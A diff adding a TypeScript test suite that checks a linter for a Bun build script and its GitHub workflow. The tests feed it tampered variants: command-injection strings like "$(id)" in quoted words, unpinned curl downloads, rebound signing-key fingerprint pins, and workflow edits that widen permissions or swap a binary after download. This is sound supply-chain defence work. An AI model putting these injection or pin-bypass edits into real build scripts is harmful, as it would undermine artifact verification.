+        `${n} — rule 11 (parsed option word)`,
+        () => add(line),
+        /printf format|is not one of the reviewed shapes/,
+      ],
+      [`${n} — rule 12 (re-evaluable text)`, () => add(line), /carries re-evaluable text/],
+    ]) as [string, () => string, RegExp][]),
+    [
+      'rule 11: printf "-v" is not a static single part',
+      () => add(`printf "-v" x %s y`),
+      /printf format must be ONE static literal part/,
+    ],
+    [
+      'rule 11: printf -""v splices parts',
+      () => add(`printf -""v x %s y`),
+      /printf format must be ONE static literal part/,
+    ],
+    [
+      'rule 11: printf "$name" is an expansion',
+      () => add(`printf "$name" x %s y`),
+      /printf format must be ONE static literal part/,
+    ],
+    [
+      "rule 11: printf '-v' is a static option word",
+      () => add(`printf '-v' x %s y`),
+      /printf format "-v" is an option word/,
+    ],
+    [
+      'rule 11: printf -v (plain)',
+      () => add('printf -v x %s y'),
+      /printf format "-v" is an option word/,
+    ],
+    [
+      'rule 11: printf -- -v',
+      () => add('printf -- -v x %s y'),
+      /printf format "--" is an option word/,
+    ],
+    [
+      'rule 11: command printf (wrapper)',
+      () => add(`command printf '%s' y`),
+      /printf under a wrapper/,
+    ],
+    [
+      'rule 11: [ "-v" x ] quoted operator',
+      () => add('[ "-v" x ]'),
+      /\[ is not one of the reviewed shapes/,
+    ],
+    ['rule 11: test -""v x', () => add('test -""v x'), /test is not one of the reviewed shapes/],
+    [
+      'rule 11: [ "$name" x ] expanded operator',
+      () => add('[ "$name" x ]'),
+      /\[ is not one of the reviewed shapes/,
+    ],
+    [
+      'rule 11: [ $wk = x ] unquoted operand splits',
+      () => add('[ $wk = x ]'),
+      /unquoted expansion \(it can split\)/,
+    ],
+    ['rule 11: [ * = x ] glob operand', () => add('[ * = x ]'), /can glob\/brace-expand/],
+    [
+      'rule 12: printf \'%s\' "$x[$(id)]"',
+      () => add(`printf '%s' "$wk[$(id)]"`),
+      /carries re-evaluable text/,
+    ],
+    [
+      'rule 12: [[ "$x" == \'a[$(id)]\' ]]',
+      () => add(`[[ "$wk" == 'a[$(id)]' ]]`),
+      /carries re-evaluable text/,
+    ],
+    [
+      "rule 12: 'x'\"[\"'$(id)]' spliced across parts",
+      () => add(`echo 'x'"["'$(id)]'`),
+      /carries re-evaluable text/,
+    ],
+    [
+      'rule 12: "\\$"\'(id)\' spliced $ and (',
+      () => add(`echo "\\$"'(id)'`),
+      /carries re-evaluable text/,
+    ],
+    ['rule 12: backtick in single quotes', () => add("echo '`id`'"), /carries re-evaluable text/],
+    [
+      'rule 12: escaped \\$( in an unquoted word',
+      () => add('echo x\\$\\(id\\)'),
+      /carries re-evaluable text/,
+    ],
+    [
+      "rule 12: $'…' ANSI-C quoting",
+      () => add(`echo $'x[\\x24(id)]'`),
+      /\$'…' quoting .* is banned/,
+    ],
+    ['rule 12: $"…" locale quoting', () => add('echo $"x"'), /\$"…" quoting .* is banned/],
+    // round 11 (review-1469-r10, HIGH-1): the verifiers were matched by their TEXT while their
+    // OPERANDS could be rebound — the check then ran exactly as reviewed, on values it no longer
+    // controlled. Every name now has one binding site (found by scanning every Assign, loop header
+    // and argument-binding command) and the operands have one reviewed derivation each.
+    [
+      'D1b: UPSTREAM_SHA rebound before the fetch and restored after the check',
+      () =>
+        sub(
+          'git fetch -q --depth 1 origin "$UPSTREAM_SHA"\ngit checkout -q FETCH_HEAD\ntest "$(git rev-parse HEAD)" = "$UPSTREAM_SHA"\n',
+          'UPSTREAM_SHA="$(cat "$WS/.prefix")"\ngit fetch -q --depth 1 origin "$UPSTREAM_SHA"\ngit checkout -q FETCH_HEAD\ntest "$(git rev-parse HEAD)" = "$UPSTREAM_SHA"\nUPSTREAM_SHA="${PREFIX%%-*}"\n',
+        ),
+      /UPSTREAM_SHA has 3 assignment sites/,
+    ],
+    [
+      'D1b: … and the rebinding line is not the reviewed derivation',
+      () =>
+        sub(
+          'git fetch -q --depth 1 origin "$UPSTREAM_SHA"\n',
+          'UPSTREAM_SHA="$(cat "$WS/.prefix")"\ngit fetch -q --depth 1 origin "$UPSTREAM_SHA"\n',
+        ),
+      /UPSTREAM_SHA may only be set as/,
+    ],
+    [
+      'D2: fpr bound to the pin itself (the fingerprint check compares the pin with itself)',
+      () => sub(FPR_LINE, 'fpr="${LLVM_SIGNER_FPR// /}"'),
+      /fpr may only be set as/,
+    ],
+    [
+      'D3: LLVM_SIGNER_FPR rebound to the downloaded key fingerprint',
+      () => sub(`${FPR_LINE}\n`, `${FPR_LINE}\nLLVM_SIGNER_FPR="$fpr"\n`),
+      /LLVM_SIGNER_FPR has 2 assignment sites/,
+    ],
+    [
+      'D3 (single site): the signer pin computed instead of committed',
+      () =>
+        sub(/^LLVM_SIGNER_FPR=.*$/m.exec(real)![0], 'LLVM_SIGNER_FPR="$(cat /tmp/llvm.colons)"'),
+      /pin LLVM_SIGNER_FPR must be static text/,
+    ],
+    ['D4: headshort emptied', () => sub(HEADSHORT_LINE, 'headshort=""'), /headshort may only/],
+    [
+      'D5: wkkey rebound before the cp',
+      () => sub('  cp "/tmp/wk/$wkfile"', '  wkkey=x\n  cp "/tmp/wk/$wkfile"'),
+      /wkkey has 2 assignment sites/,
+    ],
+    // each binder kind is a site (scanned, not listed per name)
+    ...(
+      [
+        ['read', 'read -r fpr <<<"x"'],
+        ['read -a', 'read -ra fpr <<<"x"'],
+        ['read -d "" (valued option skipped)', 'read -d "" -r fpr <<<"x"'],
+        ['printf -v', "printf -v fpr '%s' x"],
+        ['printf -vNAME', "printf -vfpr '%s' x"],
+        ['mapfile', 'mapfile -t fpr </tmp/llvm.asc'],
+        ['readarray', 'readarray fpr </tmp/llvm.asc'],
+        ['getopts', 'getopts ab fpr'],
+        ['wait -p', 'wait -n -p fpr'],
+        ['a for loop variable', 'for fpr in x; do echo; done'],
+        ['export NAME=', 'export fpr=x'],
+        ['local NAME', 'local fpr'],
+        ['a prefix assignment', 'fpr=x echo y'],
+        ['a subshell assignment', '( fpr=x )'],
+        ['an assignment in a $( )', 'echo "$(fpr=x)"'],
+      ] as const
+    ).map(
+      ([n, line]) =>
+        [`single site: ${n} rebinding fpr`, () => add(line), /fpr has 2 assignment sites/] as [
+          string,
+          () => string,
+          RegExp,
+        ],
+    ),
+    [
+      'single site: a binder with a non-static name',
+      () => add('read -r "$wk" <<<"x"'),
+      /read binds a name that is not a static identifier/,
+    ],
+    [
+      'single site: the manifest loop reusing the patch-lint loop variable',
+      () => sub('for pf in "$WS"/patches/*.patch; do', 'for p in "$WS"/patches/*.patch; do'),
+      /\bp has 2 assignment sites/,
+    ],
+    [
+      'exception list: a THIRD have_patches site',
+      () => add('have_patches=yes'),
+      /have_patches has 3 assignment sites/,
+    ],
+    [
+      'exception list: a changed wkarch site',
+      () => sub('wkarch=arm64', 'wkarch=amd64'),
+      /wkarch has 2 assignment sites/,
+    ],
+    // round 11 (review-1469-r10, L2): the rule walk's case-pattern and case-word descents had no
+    // row, so dropping either stayed green. A fetch in each is a subst-context network command,
+    // which only the RULE walk reports.
+    [
+      'L2: $( ) with a curl in a case PATTERN',
+      () => add('case x in "$(curl -fsSL https://e.invalid/cp -o /tmp/cp)") echo y ;; esac'),
+      /network command outside the script's top-level flow \(subst\)/,
+    ],
+    [
+      'L2: $( ) with a curl in a case WORD',
+      () => add('case "$(curl -fsSL https://e.invalid/cw -o /tmp/cw)" in x) echo y ;; esac'),
+      /network command outside the script's top-level flow \(subst\)/,
+    ],
+  ])('goes RED on: %s', (_n, mutate, why) => {
+    const v = scan(mutate());
+    expect(v.join('\n')).toMatch(why);
+  });
+
+  // round 12 (review-1469-r11 HIGH-1): rules 4 and 13 judged the binding sites that EXIST, so deleting
+  // a pinned name's only line left nothing to judge — the value then came from the executor's
+  // environment (one cloudbuild.yaml `env:` entry), with every verifier still running as reviewed.
+  // Rule 14 requires each pinned name's site; rule 15 requires every READ name to be bound before it
+  // is read, or to be a bash special/implicit name, or to be on ENV_READS. Each row is matched on its
+  // OWN rule's message (anchored at a line start), never on a neighbouring rule's.
+  const drop = (line: string, src = real) => sub(line, '', src);
+  const neverBound = (n: string) => new RegExp(`^${n} is never bound — a pinned name`, 'm');
+  const unboundRead = (n: string) =>
+    new RegExp(`^line \\d+: reads \\$${n}, which the script never binds`, 'm');
+  it.each<[string, () => string, RegExp]>([
+    [
+      'E1: UPSTREAM_SHA line deleted',
+      () => drop('UPSTREAM_SHA="${PREFIX%%-*}"\n'),
+      neverBound('UPSTREAM_SHA'),
+    ],
+    [
+      'E2: … and the manifest upstream_sha re-derived from PREFIX (keeps the workflow jq check green)',
+      () =>
+        sub(
+          '"upstream_sha": "$UPSTREAM_SHA",',
+          '"upstream_sha": "${PREFIX%%-*}",',
+          drop('UPSTREAM_SHA="${PREFIX%%-*}"\n'),
+        ),
+      neverBound('UPSTREAM_SHA'),
+    ],
+    ['E3: fpr line deleted', () => drop(`${FPR_LINE}\n`), neverBound('fpr')],
+    ['E4: headshort line deleted', () => drop(`  ${HEADSHORT_LINE}\n`), neverBound('headshort')],
+    [
+      'E5: wkkey line deleted',
+      () => drop(`  wkkey="$(printf '%s' "$wkurl" | sha256sum | cut -c1-32)"\n`),
+      neverBound('wkkey'),
+    ],
+    [
+      'E6: the committed LLVM_SIGNER_FPR pin deleted',
+      () => drop(`${/^LLVM_SIGNER_FPR=.*$/m.exec(real)![0]}\n`),
+      neverBound('LLVM_SIGNER_FPR'),
+    ],
+    [
+      'E7: WS=/workspace deleted (WS roots every pin path)',
+      () => drop('WS=/workspace\n'),
+      neverBound('WS'),
+    ],
+    [
+      'E8: HEAD_SHA line deleted',
+      () => drop('HEAD_SHA="$(git rev-parse HEAD)"\n'),
+      neverBound('HEAD_SHA'),
+    ],
+    // rule 15, on names rule 14 does not list
+    [
+      'E1 via rule 15: the unbound UPSTREAM_SHA read',
+      () => drop('UPSTREAM_SHA="${PREFIX%%-*}"\n'),
+      unboundRead('UPSTREAM_SHA'),
+    ],
+    [
+      'rule 15: a read of an environment variable nobody reviewed',
+      () => add('echo "$GIT_SSL_NO_VERIFY"'),
+      unboundRead('GIT_SSL_NO_VERIFY'),
+    ],
+    [
+      'rule 15: a non-pinned name read with its only line deleted',
+      () => drop('  bd="build/release-linux-$arch-musl"\n'),
+      unboundRead('bd'),
+    ],
+    [
+      'rule 15: a read BEFORE the name is bound (sees the environment)',
+      () => add('echo "$wk"'),
+      /^line \d+: reads \$wk before its first binding site \(line \d+\)/m,
+    ],
+    [
+      'rule 15: a self-read in the binding line (`X="$X"` is evaluated before X is bound)',
+      () => sub('repo="https://dl-cdn', 'repo="$repo/https://dl-cdn'),
+      /^line \d+: reads \$repo before its first binding site/m,
+    ],
+  ])('goes RED on (round 12): %s', (_n, mutate, why) => {
+    expect(scan(mutate()).join('\n')).toMatch(why);
+  });
+
+  it('ENV_READS is load-bearing: build.sh reads every allowlisted name (no stale entry)', () => {
+    const reads = new Set(parseScript(real).reads.map((r) => r.name));
+    for (const n of Object.keys(ENV_READS))
+      expect({ n, read: reads.has(n) }).toEqual({ n, read: true });
+  });
+
+  it("ENV_READS matches what cloudbuild.yaml's build step exports (the image supplies only PATH)", () => {
+    const step = (
+      parse(readFileSync(resolve(dir, 'cloudbuild.yaml'), 'utf8')) as {
+        steps: { id: string; env?: string[] }[];
+      }
+    ).steps.find((s) => s.id === 'build');
+    expect((step?.env ?? []).map((e) => e.split('=')[0]).sort()).toEqual(
+      Object.keys(ENV_READS)
+        .filter((n) => n !== 'PATH')
+        .sort(),
+    );
+  });
+
+  it.each<[string, (s: string) => string, RegExp]>([
+    [
+      'a fake pin() plus a curl in prefix.sh',
+      (s) => `${s}\npin() { echo ok; }\ncurl -fsSL https://e.invalid/a -o /tmp/q\npin q`,
+      /prefix\.sh defines a function/,
+    ],
+    [
+      'an unpinned curl in prefix.sh',
+      (s) => `${s}\ncurl -fsSL https://e.invalid/a -o /tmp/q`,
+      /prefix\.sh may not run a network command/,
+    ],
+    [
+      'the upstream sha rebound after its format check (single-site rule)',
+      (s) => s.replace('cd "$here/patches"', () => 'sha=0000\ncd "$here/patches"'),
+      /sha has 2 assignment sites/,
+    ],
+    [
+      'round 12 rule 15: the upstream sha taken from the environment (its line deleted)',
+      (s) => s.replace(/^sha=.*\n/m, () => ''),
+      /^line \d+: reads \$sha, which the script never binds/m,
+    ],
+    [
+      "round 12 rule 15: build.sh's environment allowlist does not extend to prefix.sh",
+      (s) => s.replace('cd "$here/patches"', () => 'echo "$BUN_BASE_TARGETS"\ncd "$here/patches"'),
+      /^line \d+: reads \$BUN_BASE_TARGETS, which the script never binds/m,
+    ],
+  ])('prefix.sh goes RED on: %s', (_n, mutate, why) => {
+    expect(scanPrefix(mutate(prefix)).join('\n')).toMatch(why);
+  });
+
+  it.each<[string, (e: Unpinned[]) => Unpinned[], RegExp]>([
+    [
+      'the rustup match widened to also cover a curl',
+      (e) =>
+        e.map((x) =>
+          x.id === 'rustup-toolchain'
+            ? { ...x, match: `${x.match}|^curl -fsSL https://e\\.invalid/` }
+            : x,
+        ),
+      /rustup-toolchain matches 4 call\(s\), declared 3/,
+    ],
+    [
+      'the bun-install match widened to ^bun\\b',
+      (e) => e.map((x) => (x.id === 'bun-install' ? { ...x, match: '^bun\\b' } : x)),
+      /bun-install matches 2 call\(s\), declared 1/,
+    ],
+  ])('unpinned-fetches.json goes RED on: %s', (_n, mutate, why) => {
+    // An extra curl the widened rustup regex would silently swallow.
+    const src = add('curl -fsSL https://e.invalid/x -o /tmp/x');
+    expect(scanBuildScript(src, unpinned, pins).join('\n')).toMatch(/x is not verified with pin/);
+    expect(scanBuildScript(src, mutate(unpinned), pins).join('\n')).toMatch(why);
+  });
+
+  it('positive control: a correctly pinned extra fetch stays green', () => {
+    expect(
+      scan(add('curl -fsSLo /tmp/bun-linux-x64.zip https://e.invalid/z\npin bun-linux-x64.zip')),
+    ).toEqual([]);
+  });
+
+  it('positive control: a wrapped but correctly pinned fetch stays green', () => {
+    expect(
+      scan(
+        add(
+          'timeout 600 curl -fsSLo /tmp/bun-linux-x64.zip https://e.invalid/z\npin bun-linux-x64.zip',
+        ),
+      ),
+    ).toEqual([]);
+  });
+
+  it('positive control: `cmd || { echo …; exit 1; }` stays green', () => {
+    expect(scan(add('test -d /tmp || { echo "no /tmp" >&2; exit 1; }'))).toEqual([]);
+  });
+
+  it('the real scripts contain no banned construct and the rule walk reaches everything the generic walk finds', () => {
+    for (const t of [real, prefix]) {
+      const p = parseScript(t);
+      expect(p.problems).toEqual([]);
+      expect(p.reached).toEqual(p.reachable);
+      expect(p.reachable.CallExpr).toBeGreaterThan(10);
+    }
+    // Command substitutions inside the manifest heredoc and the patch loop are really reached.
+    expect(parseScript(real).reachable.CmdSubst).toBeGreaterThan(10);
+  });
+});
+
+describe('bun-base-build.yml: credentialed job triggers and permissions', () => {
+  const wfText = readFileSync(
+    resolve(dir, '..', '..', '.github/workflows/bun-base-build.yml'),
+    'utf8',
+  );
+  const problems = (t: string): string[] => {
+    const doc = parse(t) as {
+      on?: unknown;
+      permissions?: unknown;
+      jobs?: Record<string, { permissions?: unknown }>;
+    };
+    const out: string[] = [];
+    const on = doc.on;
+    const triggers = typeof on === 'string' ? [on] : Object.keys((on ?? {}) as object);
+    for (const tr of triggers)
+      if (!['workflow_dispatch', 'schedule'].includes(tr)) out.push(`trigger ${tr}`);
+    if (
+      /pull_request_target/.test(
+        t
+          .split('\n')
+          .filter((l) => !l.trimStart().startsWith('#'))
+          .join('\n'),
+      )
+    )
+      out.push('pull_request_target');
+    const perms = [doc.permissions, ...Object.values(doc.jobs ?? {}).map((j) => j.permissions)];
+    for (const p of perms) {
+      if (p === undefined) continue;
+      for (const [k, val] of Object.entries((p ?? {}) as Record<string, string>)) {
+        const ok = (k === 'contents' && val === 'read') || (k === 'id-token' && val === 'write');
+        if (!ok) out.push(`permission ${k}: ${val}`);
+      }
+    }
+    return out;
+  };
+
+  it('has only workflow_dispatch/schedule triggers and only contents:read + id-token:write', () => {
+    expect(problems(wfText)).toEqual([]);
+  });
+
+  it.each([
+    [
+      'a pull_request_target trigger',
+      (t: string) => t.replace('on:\n', 'on:\n  pull_request_target:\n'),
+    ],
+    ['a pull_request trigger', (t: string) => t.replace('on:\n', 'on:\n  pull_request:\n')],
+    ['contents: write', (t: string) => t.replace('contents: read', 'contents: write')],
+    [
+      'packages: write',
+      (t: string) => t.replace('contents: read', 'contents: read\n      packages: write'),
+    ],
+  ])('goes RED on: %s', (_n, mutate) => {
+    expect(mutate(wfText)).not.toBe(wfText);
+    expect(problems(mutate(wfText)).length).toBeGreaterThan(0);
+  });
+});
+/**
+ * #1469 round 13 (review-1469-r12 LOW-1, rows W1/W2): the workflow chooses the Cloud Build config and
+ * signs whatever it downloaded, so its submit → wait → download → verify → sign chain is pinned here:
+ * the step order, and the exact run text of the steps that pick the config and handle the bytes. This
+ * is a reviewed copy in the test — a PR that edits the workflow AND this copy passes; see the README's
+ * "Known limits". It stops a one-sided edit, not a coordinated one.
+ */
+describe('bun-base-build.yml: the submit/download/verify/sign chain is pinned (W1/W2)', () => {
+  const wfPath = resolve(dir, '..', '..', '.github/workflows/bun-base-build.yml');
+  type Step = {
+    name?: string;
+    uses?: string;
+    run?: string;
+    env?: unknown;
+    'working-directory'?: string;
+  };
+  const stepsOf = (t: string): Step[] => {
+    const doc = parse(t) as { jobs?: Record<string, { steps?: Step[] }> };
+    const jobs = Object.values(doc.jobs ?? {});
+    const withSubmit = jobs.filter((j) =>
+      (j.steps ?? []).some((s) => /gcloud builds submit/.test(s.run ?? '')),
+    );
+    return withSubmit.length === 1 ? (withSubmit[0]?.steps ?? []) : [];
+  };
+  const label = (s: Step) => s.name ?? `uses ${String(s.uses).replace(/@.*/, '')}`;
+  const REVIEWED_ORDER = [
+    'Require the GCP federation variables (fail closed)',
+    'uses actions/checkout',
+    'uses google-github-actions/auth',
+    'uses google-github-actions/setup-gcloud',
+    'Submit the Cloud Build',
+    'Wait for the Cloud Build',
+    'Download the artifacts',
+    'Verify digests and the manifest (fail closed)',
+    'uses sigstore/cosign-installer',
+    'Sign SHA256SUMS keyless (GitHub OIDC) and verify the signature',
+    'Store the signature beside the build',
+    'Smoke-test the x64 binary (musl, in Alpine)',
+    'uses actions/upload-artifact',
+  ];
+  const REVIEWED_RUN: Record<string, string> = {
+    'Submit the Cloud Build': `set -euo pipefail
+prefix="$(bash infra/bun-base/prefix.sh)"
+id="$(gcloud builds submit infra/bun-base --config infra/bun-base/cloudbuild.yaml \\
+  --project "$GCP_PROJECT" --gcs-source-staging-dir "gs://$BUCKET/_source" \\
+  --substitutions="_TARGETS=$TARGETS" --async --format='value(id)')"
+echo "prefix=$prefix" >> "$GITHUB_OUTPUT"
+echo "id=$id" >> "$GITHUB_OUTPUT"
+echo "Cloud Build $id → gs://$BUCKET/$prefix/$id/" >> "$GITHUB_STEP_SUMMARY"
+`,
+    'Download the artifacts': `set -euo pipefail
+mkdir -p out
+gcloud storage cp "gs://$BUCKET/$PREFIX/$BUILD_ID/*" out/
+ls -la out
+`,
+    'Verify digests and the manifest (fail closed)': `set -euo pipefail
+sha256sum -c SHA256SUMS
+# Every per-file .sha256 (the file the KNEXT_BUN_BASE_EXE seam reads) must agree too.
+for f in *.sha256; do sha256sum -c "$f"; grep -qxF "$(cat "$f")" SHA256SUMS; done
+for t in $TARGETS; do test -s "bun-linux-$t-musl"; test -s "bun-linux-$t-musl.sha256"; done
+jq -e --arg p "$PREFIX" --arg b "$BUILD_ID" --arg s "\${PREFIX%%-*}" \\
+  '.prefix == $p and .build_id == $b and .upstream_sha == $s' manifest.json
+`,
+    'Sign SHA256SUMS keyless (GitHub OIDC) and verify the signature': `set -euo pipefail
+cosign sign-blob --yes --bundle SHA256SUMS.sigstore.json SHA256SUMS
+cosign verify-blob --bundle SHA256SUMS.sigstore.json \\
+  --certificate-identity "https://github.com/$WORKFLOW_REF" \\
+  --certificate-oidc-issuer "$OIDC_ISSUER" \\
+  SHA256SUMS | tee -a "$GITHUB_STEP_SUMMARY"
+`,
+  };
+  const problems = (t: string): string[] => {
+    const steps = stepsOf(t);
+    const out: string[] = [];
+    const order = steps.map(label);
+    if (JSON.stringify(order) !== JSON.stringify(REVIEWED_ORDER))
+      out.push(`step order ${JSON.stringify(order)}`);
+    for (const [name, run] of Object.entries(REVIEWED_RUN)) {
+      const s = steps.find((x) => x.name === name);
+      if (s?.run !== run) out.push(`run of "${name}" differs from the reviewed copy`);
+    }
+    for (const name of [
+      'Verify digests and the manifest (fail closed)',
+      'Sign SHA256SUMS keyless (GitHub OIDC) and verify the signature',
+    ])
+      if (steps.find((x) => x.name === name)?.['working-directory'] !== 'out')
+        out.push(`working-directory of "${name}"`);
+    return out;
+  };
+  const wf = readFileSync(wfPath, 'utf8');
+
+  it('has exactly the reviewed step order and run text for submit, download, verify and sign', () => {
+    expect(problems(wf)).toEqual([]);
+  });
+
+  it('infra/bun-base holds no second Cloud Build config or ignore file', () => {
+    const extra = readdirSync(dir).filter(
+      (f) => (/\.ya?ml$/.test(f) && f !== 'cloudbuild.yaml') || /^\.gcloudignore/.test(f),
+    );
+    expect(extra).toEqual([]);
+  });
+
+  it.each([
+    [
+      'W1: --config swapped',
+      (t: string) =>
+        t.replace(
+          '--config infra/bun-base/cloudbuild.yaml',
+          '--config infra/bun-base/cloudbuild.ci.yaml',
+        ),
+    ],
+    [
+      'W3: an --ignore-file added',
+      (t: string) =>
+        t.replace('--async --format', '--ignore-file=.gcloudignore.ci --async --format'),
+    ],
+    [
+      'W2: a binary swapped after download',
+      (t: string) =>
+        t.replace(
+          '          ls -la out\n',
+          '          cp /tmp/other out/bun-linux-x64-musl\n          ls -la out\n',
+        ),
+    ],
+    [
+      'sign moved before verify',
+      (t: string) => {
+        const a = t.indexOf('      - name: Verify digests');
+        const b = t.indexOf('      - uses: sigstore/cosign-installer');
+        const c = t.indexOf('      - name: Store the signature');
+        return t.slice(0, a) + t.slice(b, c) + t.slice(a, b) + t.slice(c);
+      },
+    ],
+  ])('goes RED on: %s', (_n, mutate) => {
+    expect(mutate(wf)).not.toBe(wf);
+    expect(problems(mutate(wf)).length).toBeGreaterThan(0);
+  });
+});
